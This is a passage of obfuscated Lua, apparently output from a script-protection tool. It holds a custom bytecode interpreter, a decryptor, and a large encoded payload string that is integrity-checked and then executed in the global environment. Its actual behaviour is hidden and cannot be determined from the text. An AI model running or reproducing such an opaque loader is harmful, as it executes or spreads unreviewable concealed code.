_iz[_mh] = _ws[_ik]
_pz = _pz + 4
elseif _ab == 15 then
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
local _en = _iz[_mh]
local n = (_xi == 0) and (_ey - _mh) or (_xi - 1)
if _ik == 2 then
if n == 0 then _iz[_mh] = _en()
elseif n == 1 then _iz[_mh] = _en(_iz[_mh + 1])
elseif n == 2 then _iz[_mh] = _en(_iz[_mh + 1], _iz[_mh + 2])
elseif n == 3 then _iz[_mh] = _en(_iz[_mh + 1], _iz[_mh + 2], _iz[_mh + 3])
else
local _ws = {}
for _po = 1, n do _ws[_po] = _iz[_mh + _po] end
_iz[_mh] = _en(_uq(_ws, 1, n))
end
elseif _ik == 1 then
if n == 0 then _en()
elseif n == 1 then _en(_iz[_mh + 1])
elseif n == 2 then _en(_iz[_mh + 1], _iz[_mh + 2])
elseif n == 3 then _en(_iz[_mh + 1], _iz[_mh + 2], _iz[_mh + 3])
else
local _ws = {}
for _po = 1, n do _ws[_po] = _iz[_mh + _po] end
_en(_uq(_ws, 1, n))
end
else
local _hf
if n == 0 then _hf = _fs(_en())
elseif n == 1 then _hf = _fs(_en(_iz[_mh + 1]))
elseif n == 2 then _hf = _fs(_en(_iz[_mh + 1], _iz[_mh + 2]))
elseif n == 3 then _hf = _fs(_en(_iz[_mh + 1], _iz[_mh + 2], _iz[_mh + 3]))
elseif n == 4 then _hf = _fs(_en(_iz[_mh + 1], _iz[_mh + 2], _iz[_mh + 3], _iz[_mh + 4]))
else
local _ws = {}
for _po = 1, n do _ws[_po] = _iz[_mh + _po] end
_hf = _fs(_en(_uq(_ws, 1, n)))
end
if _ik == 0 then
local _di = _hf.n
for _po = 1, _di do _iz[_mh + _po - 1] = _hf[_po] end
if _di == 0 then _iz[_mh] = nil end
_ey = _mh + _di - 1
else
local _sg = _ik - 1
for _po = 1, _sg do _iz[_mh + _po - 1] = _hf[_po] end
end
end
_pz = _pz + 4
elseif _ab == 1 then
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
if _ik >= 256 then _ik = _yu[_ik - 256] else _ik = _iz[_ik] end
_iz[_mh] = _xi + _ik
_pz = _pz + 4
elseif _ab == 17 then
if _iz[_mh] then _pz = _pz + 4 else _pz = _pz + f5sm6w[_pz + 2] * 4 end
elseif _ab == 8 then
_pz = _pz + _mh * 4
elseif _ab == 24 then
local _ws = _iz[_mh]
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
if _ik >= 256 then _ik = _yu[_ik - 256] else _ik = _iz[_ik] end
_ws[_xi] = _ik
_pz = _pz + 4
elseif _ab == 3 then
_iz[_mh] = f5sm6w[_pz + 2]
_pz = _pz + 4
elseif _ab == 31 then
if _iz[_mh] then _pz = _pz + f5sm6w[_pz + 2] * 4 else _pz = _pz + 4 end
elseif _ab == 29 then
local _xi = f5sm6w[_pz + 2]
if _xi == 0 then
local n = _ey - _mh + 1
if n <= 0 then return end
local _ws = {}
for _po = 1, n do _ws[_po] = _iz[_mh + _po - 1] end
return _uq(_ws, 1, n)
end
local n = _xi - 1
if n <= 0 then return end
local _ws = {}
for _po = 1, n do _ws[_po] = _iz[_mh + _po - 1] end
return _uq(_ws, 1, n)
elseif _ab == 38 then
local _xi = f5sm6w[_pz + 2]
for _po = _mh, _mh + _xi - 1 do _iz[_po] = nil end
_pz = _pz + 4
elseif _ab == 39 or _ab == 12 or _ab == 13 or _ab == 4 or _ab == 35 or _ab == 36 then
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
if _ik >= 256 then _ik = _yu[_ik - 256] else _ik = _iz[_ik] end
if _ab == 39 then _iz[_mh] = (_xi == _ik)
elseif _ab == 12 then _iz[_mh] = (_xi ~= _ik)
elseif _ab == 13 then _iz[_mh] = (_xi < _ik)
elseif _ab == 4 then _iz[_mh] = (_xi <= _ik)
elseif _ab == 35 then _iz[_mh] = (_xi > _ik)
else _iz[_mh] = (_xi >= _ik) end
_pz = _pz + 4
elseif _ab == 14 or _ab == 9 or _ab == 43 or _ab == 20 or _ab == 7 then
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
if _ik >= 256 then _ik = _yu[_ik - 256] else _ik = _iz[_ik] end
if _ab == 14 then _iz[_mh] = _xi - _ik
elseif _ab == 9 then _iz[_mh] = _xi * _ik
elseif _ab == 43 then _iz[_mh] = _xi / _ik
elseif _ab == 20 then _iz[_mh] = _xi % _ik
else _iz[_mh] = _xi ^ _ik end
_pz = _pz + 4
elseif _ab == 34 then
_iz[_mh] = (f5sm6w[_pz + 2] ~= 0)
_pz = _pz + 4
elseif _ab == 23 then
_iz[_mh] = {}
_pz = _pz + 4
elseif _ab == 40 then
local _ws = _iz[_mh]
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
if _xi == 0 then _xi = _ey - _mh end
local _wd = _ik - 1
for _po = 1, _xi do _ws[_wd + _po] = _iz[_mh + _po] end
_pz = _pz + 4
elseif _ab == 2 then
local _xi = _iz[f5sm6w[_pz + 2]]
local _ik = f5sm6w[_pz + 3]
if _ik >= 256 then _ik = _yu[_ik - 256] else _ik = _iz[_ik] end
_iz[_mh] = _xi[_ik]
_iz[_mh + 1] = _xi
_pz = _pz + 4
elseif _ab == 11 then
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
local _lr = _iz[_xi]
for _po = _xi + 1, _ik do _lr = _lr .. _iz[_po] end
_iz[_mh] = _lr
_pz = _pz + 4
elseif _ab == 32 then
local _gp = f7k4x7[f5sm6w[_pz + 2]]
local f2p537 = {}
local _km = _gp.f2p537
for _po = 1, #_km do
local _vn = _km[_po]
if _vn.f145yt then f2p537[_po] = _iz[_vn.f6ospz] else f2p537[_po] = _mw[_vn.f6ospz] end
end
_iz[_mh] = function(...) return _qt(_gp, _fs(...), f2p537) end
_pz = _pz + 4
elseif _ab == 37 then
local _xi = f5sm6w[_pz + 2]
if _xi == 0 then
for _po = 1, _tw do _iz[_mh + _po - 1] = _iv[_po] end
_ey = _mh + _tw - 1
else
local n = _xi - 1
for _po = 1, n do _iz[_mh + _po - 1] = _iv[_po] end
end
_pz = _pz + 4
elseif _ab == 27 then
_iz[_mh] = _mw[f5sm6w[_pz + 2]][1]
_pz = _pz + 4
elseif _ab == 25 then
_mw[_mh][1] = _iz[f5sm6w[_pz + 2]]
_pz = _pz + 4
elseif _ab == 18 then
_iz[_mh] = {}
_pz = _pz + 4
elseif _ab == 16 then
_iz[_mh] = _iz[f5sm6w[_pz + 2]][1]
_pz = _pz + 4
elseif _ab == 42 then
local _ws = _iz[_mh]
_ws[1] = _iz[f5sm6w[_pz + 2]]
_pz = _pz + 4
elseif _ab == 10 then
local _ws = _iz[_mh]
local n = f5sm6w[_pz + 3] - 1
local _po = f5sm6w[_pz + 2]
while _po <= _ey do n = n + 1; _ws[n] = _iz[_po]; _po = _po + 1 end
_pz = _pz + 4
elseif _ab == 5 then
local _en = _iz[_mh]
if type(_en) ~= 'function' then
local _ws = getmetatable(_en)
local _xi, _ik
if type(_ws) == 'table' then _xi = rawget(_ws, '__iter'); _ik = rawget(_ws, '__call') end
if _xi ~= nil then
_iz[_mh], _iz[_mh + 1], _iz[_mh + 2] = _xi(_en)
elseif type(_en) == 'table' and (_ws == nil or (type(_ws) == 'table' and _ik == nil)) then
_iz[_mh], _iz[_mh + 1], _iz[_mh + 2] = next, _en, nil
end
end
_pz = _pz + 4
elseif _ab == 21 then
_dx[_yu[_mh]] = _iz[f5sm6w[_pz + 2]]
_pz = _pz + 4
elseif _ab == 6 then
local _xi = f5sm6w[_pz + 2]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
_iz[_mh] = -_xi
_pz = _pz + 4
elseif _ab == 26 then
local _xi = f5sm6w[_pz + 2]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
_iz[_mh] = not _xi
_pz = _pz + 4
elseif _ab == 33 then
local _xi = f5sm6w[_pz + 2]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
_iz[_mh] = #_xi
_pz = _pz + 4
elseif _ab == 41 then
local _xi, _ik = f5sm6w[_pz + 2], f5sm6w[_pz + 3]
if _xi >= 256 then _xi = _yu[_xi - 256] else _xi = _iz[_xi] end
if _ik >= 256 then _ik = _yu[_ik - 256] else _ik = _iz[_ik] end
_iz[_mh] = math.floor(_xi / _ik)
_pz = _pz + 4
else
error(('E'..tostring(_ab)), 0)
end
end
end
return _qt(_sv, { n = 0 }, {})
end
local function _jp(_lr, _br, _oy)
_br = _br or 1
local function KMVX8(_mh,_ik)
_mh=_mh%256 _ik=_ik%256
local r,_aq=0,1
for _=1,8 do
local _hu,w=_mh%2,_ik%2
if _hu~=w then r=r+_aq end
_mh=(_mh-_hu)/2 _ik=(_ik-w)/2 _aq=_aq*2
end
return r
end
_oy = _oy or 57586
local function _ru()
local _xi = string.byte(_lr, _br)
_br = _br + 1
_oy = (_oy * 2082 + 31737) % 65521
local _yu = _oy % 256
local v = _xi - _yu
if v < 0 then v = v + 256 end
return v
end
local function _cw()
local n, _zz = 0, 1
while true do
local _xi = _ru()
n = n + (_xi % 128) * _zz
if _xi < 128 then break end
_zz = _zz * 128
end
return n
end
local function _nx()
local n = _cw()
if n % 2 == 1 then return -math.floor((n + 1) / 2) end
return math.floor(n / 2)
end
local function _yy()
local _aq = {}
_aq.f8em35 = _cw()
_aq.f7kzbl = (_ru() == 1)
_aq.f2qjz = _cw()
local _ch = _cw()
_aq.f2p537 = {}
for _po = 1, _ch do
local f145yt = (_ru() == 1)
_aq.f2p537[_po] = { f145yt = f145yt, f6ospz = _cw() }
end
local _vc = _cw()
_aq.k = {}
for _po = 1, _vc do
local _qa = _ru()
if _qa == 0 then _aq.k[_po] = nil
elseif _qa == 1 then _aq.k[_po] = false
elseif _qa == 2 then _aq.k[_po] = true
elseif _qa == 5 then
_aq.k[_po] = _nx()
elseif _qa == 3 or _qa == 4 then
local _oj = _cw()
local _fo = {}
local m = 243
for j = 1, _oj do
_fo[j] = string.char(KMVX8(_ru(), m))
m = (m * 209 + 233) % 256
end
if _qa == 3 then _aq.k[_po] = tonumber(table.concat(_fo)) else _aq.k[_po] = table.concat(_fo) end
else
_aq.k[_po] = nil
end
end
local _kb = _cw()
local _yj, _ni = _cw(), _cw()
_aq.f5sm6w = {}
if _kb > 0 then
local _jl = {}
for _po = 1, _kb do
_jl[_po * 4 - 3] = _cw()
_jl[_po * 4 - 2] = _nx()
_jl[_po * 4 - 1] = _nx()
_jl[_po * 4] = _nx()
end
local _jw = {}
for _po = 0, _kb - 1 do _jw[((_po * _yj) + _ni) % _kb] = _po end
for _po = 1, _kb do
local _qp = _jw[_po - 1] + 1
local q = _po * 4
local _vn = _qp * 4
_aq.f5sm6w[_vn - 3] = _jl[q - 3]
_aq.f5sm6w[_vn - 2] = _jl[q - 2]
_aq.f5sm6w[_vn - 1] = _jl[q - 1]
_aq.f5sm6w[_vn] = _jl[q]
end
end
local _fd = _cw()
_aq.f7k4x7 = {}
for _po = 1, _fd do _aq.f7k4x7[_po] = _yy() end
return _aq
end
local _gp = _yy()
return _gp, _br, _oy
end
local _7={
"ru27aviUCWhIXrOqz15rMY7dhELETGR131udkno42LI5HoG3aa7MvcSsQVcJR3VPyG0Jo_gqRSslDRk9ymMI7qsIai-ABSYul0tjkqAuyCdJzJVjAbAd59mVx2WBLlNfAyfkc3SjROgINOtVRtrzDHEb59ClXgtMcMYqxX5DfGQXfetYe_BTnKaI1q5WISPKPA4QRsRKjdtwIZLL2uNI600aXMY3ZBlSxR5kFFQX7VyxCGQw37lDo4N_MVfEfXRauZvBBwJVGx1fM9X5ECzfcadGRIWfICqHk1IjYI1ElRvCejjxvbk7e9dytaiuR0q5nBklZlTugc8rAyYQnNK-5-wZ2ATQdWAdnaTMoXG4LVWCoC-2yCQ-w6STVZ90y8RW5y-WEwwea5_UtcbbIGJa48i5hJfKOPGV1f9hSeHKMlecwEkkTr0biWrNPlonPloXLu0gquMSAOv7oKHr0_TdKwhX0-cKDi3IhQWzCjodwCu5ZcuGUF7S0_aZtVzA0Siq_YKROh01EpqMFUJ52QltYLcBTBeDQVt5m2RB3WVpfkIRww9sN-LdeQNIIqKh6L5yhAe8QHfpZ3LXyPnpzKq4WMc_wS1_tgCB9wg729baXwSAQdOkJu1Rpvgn82hCiOmha7GD-xdTgCoszyYyleS36xv5IQ3ydYtizA9BT6P6QZP0phy2mV71geJBqh-AxaRUfv12dmBIT1hKSsv5wVp09okrhIKxeO0GfNZbtCUOY75m7MElsUFw592IdX3biGAgHGuMJj0jKIi9MUQm2d5jdgj9XopTcsf-X96TfBFanAtno30S24HmkNDk-4-0649NU6fDkcKP5Ay6uSjCUpVhcwjzB2QBmb4c5-dBAhr3K-_hJGJgNS4Y3x0DgmG_S2VlVabNQZyuF_a00wQr0YlqyB_AGOMhlD1lzzmm6tSOfplz9B5Dolt4OdAUxWiZ0g_aqIitkyyA4C1aJpT9O6ssq0453S958mQ32_SVUw1UYalDozNs4mgkbG-v1rq0xsm6CDchB0FTPxACjYj1tHM-BltkgCGdKodRxTd94dOABnCYBu7GkFTIavvAsywarQnTmbAtrsI32uEvjHU_CNxfdX88l5W8pAOM6QXShh6gqjWzLVrwVSFtfZeUAXii1ReWr4HGuB5oD3JwUctMxYldunJSMxkORCu7IuwrM7sgiAaSEW8G7xARbiHCfoNnRg9-lZXIUY9MM6_lwlFwhDEqGquItmNUD7d5ijBeQQtvJphllXemKNkMTkkejRWhjNu-4w3zS_DaLGElsTx_YAQWVNwtABqVroYmTe7NVZKvIKQGPJNtmJFlgiQqAdMnljjNJix1A9afZYjiie15uQYl10AkXlB4PokIzwJLO6EH-Qnn5ogHGk7KR-S53YlwZft6g27kaLlHVR4J3sYDLzN_UMFCVgbubGxwTOr8H6OpPSaAM7OkozMM_5ZCHr3SGD6cX1vnpWq9fJ5bOjooUmuCRcsvobHJ-wh3-lxceqr8AfmdJ-HPO9cZAYg6GHlS3SxQKNSluhgE2dDXjliqqv45xwlcp-Bc9lAeEXWUFMN_GPaa48oQ5LMT1prwtxYkglAQPBEfeQ37WGAFtdJgXwFsNPHNaInyuBXHjyMN5Wj4CXIjBD79ukGThbm0NSQtyFLGD73oO2DfnlpP8719lEXDDLT5uz4U6FQxCwDbiHCbq6-_SHyT_gpAgxixCxxi25OPjUGCVtAlV_2RfRySu65anFyEkjweM9v_smOeI53Xzd6433oGynfdr8w3MXDOdc6i1A72cFU3V_OB1l3NdpsURZQghTLY8-iGXxJjzajFsPWzKCgk-c-dQMIVP6arzYRL2u5flaMjifYqaIPwPJxE-W6ne04MV4U0vmR3X-EcrzbCmc4VAp82dfIbN-u5FPZADuVS1iyL7bVOMnVukQCqhOvRJ3hgYo7gbYwbh1l64fPqAChevi7VF73Kf69WTRdIOArQ0qSUvSR4Wr8ms8g41ul00xv6dBpDq6228yY-BRnUz-3gvWvBhyTF_sbFJNO6a447bj52nY8BQwpwRRfeAbwn2UM3hwEtzntOsZ85UAPPohAGfy3B0fw6OZQAQgQ4Gk8NSfGsxGkaGPrR5klw7KDWsNgDf6sxhFrAmRzNouXebaRk0cPuxpMlDQt3NnNNmpy-yWDVzWpxJLwSAqY5nc6wsg1dKX6_mf7ttnSmU9ghfZ_nKqPUTarec3IcqCYk3XFAW2UtezQEf8ZU5jtIzntaTKD-_ylzkpmWwHynYeqnADI6dJfVk5ZtluYkeqo5MyoCwNEmVTgmjYsOlQulbKQxJ7D681IwPw_0JAFKYctz702luvcn586dFFqtfc1iwymMcihKv0Q3HmuAZhF6b8d2tn5kdL-ncVkb9_mm8sDZAVEH_ro_PiurVS-bfagz9scIIH2giSeelvc2D7GvFnNo3KlUPnZkNOnoQPnNT0f83Subm5xoFdFsRdWI3fV0rHwYpjk6ChhILBg44-nF0l6dyxcafTsk4mGnOq5HPTlqmeWbGaev8LkyEakPb_gBQsHoA5hnVNNdATCAqLxCBNkGJ9CmPHYwzYMfURk19Xm7yVY6AzjaN8cCZg_DaFX3pTYfpxvUmB9gw2jmhSiMw7fb_FnFohD6G_KQmQUv5KsZ6nIMFrsXT8hmFm-SpZ6zZbENBaWj2b842sMf25vMQ0Z4w7kzclQ6m1JdsNp18nf1gCEAlhyJU0gx3-hDZdq02JWirLNSJep4GnpcwpmtBDCWxR38sDDR8OMRyj_U9jDv2r3o3QmjLmgr_i4idzxHy1nkcz4qyy-uI5dkYj3aV_qh4pQrKlDc3htKf-r6w4RQDbBSnI9Wmm4Hf4oK0KCsxHvXq-y8g7gIbSBaV4z2jnxYk91JzgQnG72FoGCwmnlOWkFhC8qEioRHNWjcnoVmaxdGE95_bwQq03N9iWaCvTjc08T3Ul4wJnqiDsi1DG-wiThkWtQWi5xuKYY6i-5wrlYTl-gCgoqA8sAe5gQD7vOjmmFpJiuK9P8L1ysmwZr1oY2RY8LgQyKfNRcCCwaSYzdqzzwlAsa84eydx5AVF2GdtptFoRHuBMJiPyzJnXvTiBeld6ps5VnG9WmNrjDKJUEH7JtBUv4moLrgfnrGQgvVJXpj72iSheTEf00EOp-aPsG9igFWa040xc4EhJlb1gEUFQvj6UBjhbXo-u0zWzDvL8Igf6HYjE2zlXVdiPEdZECS9Qas5msIgRWiLLygBiiEmHP3q1GjxtmR5mRj_bWe1Jcdapra63SrDm3uGrKJh05H-el_qb2kkqLqwfGkSm5l8-qtqDGzloNqo9Fe4v-0WSSuDWnMr4ICVTp-xSuE9_1d-8Y5kY6u283v3R8VuzldfiKP8F9peTUGdUFus2xGVm0Ixqu9qkdUeyzlphSVWzVi-E1IZ_fNSwrzC2IZkdDJNJxEz5EO-CjI9DwUaaNAhZOiIh8cCJltUIrLfVtx7FERhU_ipTyqCom184nCFaU6U22C2Tav3O4Es6JJDZzYmq6wAzJ2lNigeyZVvnmyTxejpKQ_jpmYw9uz4PZrEYn3cFXOH9ZxjPOhzdt-befoCQwwLEIdCPZ1HQxLpTMYY_uRH7hPq4H52zABBXaXy16HXosJDXvM66TnN1Izy8DkhpKtVAAYsIpTBgo-IJhxNVh7pJ6yxJYdJh2oPETkTFQ1HR9DB7tVvI8vtE2yo_pGyplzXmnbTrcCFvjDwhTe1hSpIR3Bm-WBNAtW_YP_xgbPUSQJ2BWVoXjhgV9v4Tn13gGhDljk2lQ6hdTWyPcYuKZoE8NtbYU_k8C1-Jsaok7mo2-4QhO7wjSF_Tz0MQXPzVJMIDwOrNckzvSVFgw20hl0pe7RTq00vuDN5lIcV2I67DiVd-9hpAIkcydoWlBAnmpi6QbDfXDJwXAZttIPgMjfUkwmUu6Pcqmx62ow6xhC6gY23xEHm0cD4mOkcXZVXG5q8tLCmx0aEMXWFCrGtvWVMeOa1Qrf8AVPr2FcDLNxw_9hsnesj4LZiy-IJP4iBUl96NPIynfvtDYdF95gKzE6P5wThtsWOdBpBCuF0wCkHhYKqf8yhE5k4MS4p4cpafUerQX3Q1ghZprztub1y7pYfNkK0D5Vv801sMmVP8lnvEwGT6GTOtrTTHeM-Ye_S-QyRgSqtjCc_bvdNmtzunLFOfxqydneBpm8650SI1lS0Rvf7n0Wxi3VDTHL7h8Gtnjz0yzYXnLFaL5_0Ziu1YPRB584ACfh9tyb0v5kr3vHad4vFgLy9d41KWnwgjv1qqeSSpd8ONRQ-zo4Se1nsUY9Uh0kpg-H0TJeTBiiIqPFgekXyu4qSZffw2EnQd2g14VgFSLT2MlHPOBd5WZPm0RXiJQC6_4N6_4lgBFS_HHr9LAnrCdP25NdMlFO6rNbvet3pkQocIzh7GvK-yR-0e4otSRa9NrScF-05I8Ofnv9qjrOXMeFSP4Wj_AA4IXzAHuILO3WYLVVnP8I4EbGgR2b44uIE5yxf1Vlp8LuxTGiKh20iOqAdTQJ8AIAlcfCp30-iindRCP8gNuKjGMugEO0bFjf-ABXdEIYtlnJWHcFO_rhXfSCQxn8D5Rhx18LMzBrIZLmfW5OcDhExQ4gNF1oKxamVa-0O1Acox-T1PEQECrtULjcQT1NhwoCsxVsVxWDIeDyHBEvZ20wCvdpGTT3CJBIhlwX6wJjFE0YC-MDtPq4PQr_0bJZEpBVf7-MIRw4CIyHfhZwbHgl8VumVJAa7NGCz6CfSFOX9roI67mAVxMUGyMtYhDvPxhgrg0wK-X8W_F_leUFZVVAFQa4BZyaP9oW1_bq-d7lR5EDLM0aDl7XPe2h6S8NauVFNS887NgkQ9NpXNj9FZxIybjYBOOv2GCW1VNPgSnmFZ-ygzeDZKDXl-LZFILfMpMPrcBpaOFyAIW-9CmJhyWfGA-_gDeMnogB1jKyePSYH3wWNyJxSX4EwlyDae15yi9qoJAVdnyhEWgvh2zhOT7uDn5ZTcsZouo25Md-5N9OXX4d5K8I1KolHCbZDluSJoJcyPT8j7TO1H-XPt_mISTEf6qRzzhj8U_nEgQ7FECGquCrnqFpcOWap8jG_gRPzf3CNa7tFUn4GQq-aCpdPrppF9SHsSrSpg9_OQyYhp7XCy-x-OoQ0t5YXSHfB3teosDi7NPXoYkNHOGa7xkFI1qGyoS4okf3eYr5d2mlyot6iz2MkUhLHLGuF9xmPZLm8-vT63HtYZl4AOtSbCdUGhtR7AQ345w6HYc-4U5Ou_Xg6j-irDTA5Vd3zv6Rwz7-zaPPVexRtZfKJF_zXiYJYJPetRbZrSJ_Srw3FLe26su9i32O6MceEiljtprxkkdUJwl_m-xNGzq1GWnofcVVnVrh5QlA1vTWsfC4OnNaEzzhvFFDSFNoCbXlnJa587xEHlTyd95C40KdnKyrfoXdycNA6BCY7tlEWHo-eigLusQUVI6HpFVDOxU38nwzpad-u8N7qbzGzcgbYJJGMEF6HeYbAOCz1LszXjANXLQ0wzB7yCx_eRU7q9i2NK7oquuQvqxbSIjNaASjhdC3zLCM_4n5FCZ9h7YdaVIBl06GdeT7_IOU7MTU7Eu2FrtquOLbA6MQ2sRU2xwQfgWVLXBJZ2tXEPa6NCoM55fecflQFMQYIL1FX_sDi_md2HAMt0DKeavfLUJzM8qCzwPXFLUbyxr0Ipy6XBuV_gM0aMVwh2oNlMuHyAfaErRB5Wu0WpdAaiP8jLVdNcZxepexN9KjlEIPg0NBQvPwOejnSxHlT6_noQzj9_RXX6a0vbhXDUHS6Uzguz0EdkqGsrRA3SW-Cx7n0vFC26D9brXX2LaaQSsNqilcs9R4H5tMfHAyczD1ZaUYCvlaE2DJTxLf8FsrrHZEv_-jxmnATOfYPTvr3P3bbvX3LZ0CV1Ng1s23BUYcdocumbHHJStP-NNY1cj0qdcmPkJEhDBUn47KmTIcepGpz63ONCfQCWI6kzH--baSZ6XTuti6WrPw2jqqcrffGyrs_a69YdJ5AUTAN3QUdX7BnVL8ySzSGhZG078FB_7i7kcnvRhvL_0YRrJut83GPaBQU0ddo7ryRgI3sMxeIDg5UFobXpnG_vGOaV84Mgk8OoscPqg_MQpTYnPM-Awe1VTEAlhCeAaLm-UCfljdnCjw9B-B4ca9wwxr8-xiOPQwAfI9tBlbNP5Y10gYimCBmzJX7Bo_3cYeT68b64KT4jFbzgYT1BjPvl41sYLK4BJDmgqDE0ZFdYwAO3dhTWNHMmVwACFwccBcZDKehl3nWfGLJoofQPe_2MHbl1g0iiOj7PVZ3C07gzvnyfvMjY9wbNr-N_yrD02wPLrvumOHrR6nrtP_d7NE4m33-EMszLOLBnK8nn5PVLdf6sblPk1IGXPxzNo95r6hVUiL-DUiYCT5sinbGJ_ovoB1mS7CLVfdeC8-a51Xm099j56TE3Oqf0csD4qcyYxHuIHzYH7fDak6a1kWXrnvH6rSQsgK8JgkMw3uHO9VLGp1bLYdRCDqDKIkkejQMGXFYL23bRE-cYsRSHYX8JDUKuzFqHAebmHvlYAOiFAkJOdXrOcoPtptKlD7agv9A-ob0m8qLSXp-58Hxw7jLrmhJiDMDpO3n2FBn90GSNeoTOIiPQIy43m7l6uzVf0gAtkAzgBv2AaCjRQfqrZBRhbsjx3WKFyIdLcZQdGiXgdJ7kTcCYTC4VB2uc4xurqhO6-HJ-FZbk33TP8s9APynkb8qcbFFDMhqYOHUmU7pnWUeYs0z45v4wee_LapCCyJ8qbWAcZb0nnaGk2cP5XPGxgwZ927S43ScMfTgRHwX8WPy8SKXol-n1Q6N78N7PuZ-RMZilIjNF_rvtBcWnaXB6TwYodI6MnNoaa6wJ--S7Dt51BT22m_fee_KnUpyvO_BOd9cdcBWlm-ctk6-9hXhcuMZnndLL9e4_cKNDXbykkegGVtPWcw48pLiTxt3x5AvLJt-lh867KIgKlAgcDFTqhkXWOCC69xrhFJZoQiCHoPWt6uHzoqSonf14SG_mbWzBr3SGE3x-FSrQ9z4WV6ZJZmgKjuNflIaFV8Q2YX_bcxrXCrY-9MyyxzBrc1rB_dQJdSeOsKHmlYjXi3KFWbRVKBb3Qosp6xb6BJI_MJHh33aeGQM0a9I6efb7mzE0kihrU86Kz_V7cTNqEELDqWOBdKLaRPlLOJn90StNkTqGqL87AqjolkzE6M-9dP2IY7750j7RjfpbMBmVTkBjCmAnU1CzkLgg65iSGr6PFU5fIvRQ2fDNwJ3MRxWlXP5_nZMndNezugefAJhNAOoofOZK692mCPl820wewLAEFx4jmLZJxaQvfkhHRp1xk8jxwWBLmCAWZ_gba2aAb7nY6DA5WdAaILd0BoCuaKB34725td6VuVIVGscTJxOWM3fTI0xhajFMFi9PT_NTW4ZYlxyWk-Fv0XqPCmhMxMO2_kOBBvh_v9kXH1C6pAz-bMiUueDahVlpIOI3SpxSsuaqxuMwFDvuDy4qt3wE220SSgDNZK6BF_6NNBcIq4kuq76KJ45Yd4k9DOjFk9zjNkjNWtHudNbhVq_r91uxDFKJgju74uSmJqmGRN9LHat9FcCuGD4CkgBsVlmSkM5SJ8YjkJ3--M5YVSQd9fviuU8SnVWJe7C_FiJ93cNszoG6rK_lobxdX9OKpa2Bcp-j2tzYLWEzQ3q_SXc1no6TBuIY_b8YYt64eQf7VMrQzMrjGgfuciYc7R2E8arPsLHFD2zQuOW1UjB5D5kxJ8YGl6EozA2pxcC6R_cRsdcxhBDKN2q3ZEslPdrafHBn-LYzWCd7wmIeFTm-cQMHW9vk5FYEQEHsMZBJyeeJ9GxSux3A969iQ9yRcM5WalCl_Qmh9NBhvaAbZDELP1chyGBr-IXiJBZkPUlWbjqYU6BSgP4suLoQqpdjshUqJ5",
}
local _64c={1}
local _5d={} for i=1,#_64c do _5d[i]=_7[_64c[i]] end
local _4,_5362=_2a1(_f0a(table.concat(_5d)))
if _5362~=2169919729 then error(string.char(50,57,54,56),0) end
local _163
pcall(function() if type(getfenv)=="function" then _163=getfenv(1) end end)
if type(_163)~="table" then pcall(function() _163=_ENV end) end
if type(_163)~="table" then _163=_G end
local _68,_fa9e,_e275=_jp(_4)
local _bdc9=_yn(_68,_163)
return _bdc9
end)()
end)()
if type(_3ce362) ~= "table" or type(_3ce362[1]) ~= "function" or type(_3ce362[2]) ~= "function" then
  _cbb12a(string.char(80,114,111,116,101,99,116,105,111,110,32,117,110,97,118,97,105,108,97,98,108,101))
  return
end
local _baa0f0={}
for i=0,255 do _baa0f0[i]=string.char(i) end
local _9b3d3f,_a8b7f8={},{}
do
  local ta="32eced88fc579b639525f1d2312e13de6c81e2540097a946353d52b4e18dba62a6e0eb24bc5c2cd14f553eab84a21e4ab72ae580a5e8f8ad5bdc049ee7acf7ae148a22d694a70f34827ec5b9b0665d08e4eaf056dd47c8702976e610734b7a7cc7890d7bee862dfdcc3a5f395ebb93d9bfbef6c46a17c1b52b09b1a08e5a1d38ca368cd00a40789dc3a4ce3faff921d47401d869872723f24db26b9296b8cbff588fc91172c09f18a3983ca11602fa4833031a2060a82859506daa4464914c41bd0b6f19f4b6777fdb0e790507f3fed312673bd5c2dad745cd49719ccf1583435375377d422f1c1f26c6fb061b61efe365f50c9a30df856e994e90b3e9688b51"
  local tb="1dfbfcd25673ad686d52b98d1c444e9c229e5cf807784dee3974c5f046ccd86e772434af900b8c038240a61900dc3fa96bab0c05da4189551f72e3763637c86f7ea0a598c7cb97d1bef5a2e6588625e492913b20694a83f631d63e6448475342c0d7dde27d8bcaa8eca30e2ff35feb262c5b2906590f96c417e92dae1651bb634370ef9b1e62aa4b3c32f1b1d4932e0d159dd957b77ac67c0149c9ff79c1e06661108ffeb0880218bac21a7f1bcf233ae508b85abf1330b2040afa11d3ed854ce775ac9584d52aea1254d07b71cebc45f727b49fc3878a35e16a679a4f33e82b5e389914652128f49450a7dfcdb6bda481dbf2a1605df980093ddeb38e6cb5fd"
  for i=1,256 do
    _9b3d3f[tonumber(string.sub(ta,i*2-1,i*2),16)]=i-1
    _a8b7f8[tonumber(string.sub(tb,i*2-1,i*2),16)]=i-1
  end
end
local _982115={}
do
  local a="bHexFQP28nzKpfyZO_YEJja5l4qG0A1W" .. "wXT7RuVhD-mNrBcCS6vL3iUsgdkIotM9"
  for i=1,#a do _982115[string.byte(a,i)]=i-1 end
end
local function _972da6(s)
  local out,n,acc,bits={},0,0,0
  for i=1,#s do
    local v=_982115[string.byte(s,i)]
    if v then
      acc=acc*64+v
      bits=bits+6
      if bits>=8 then
        bits=bits-8
        local d=2^bits
        n=n+1
        out[n]=_baa0f0[math.floor(acc/d)%256]
        acc=acc%d
      end
    end
  end
  return table.concat(out)
end
local function _06fdfb(s)
  local v=0.0
  for i=1,#s do v=v*16+tonumber(string.sub(s,i,i),16) end
  return v
end
local function _e4d5d9(s)
  local h=0
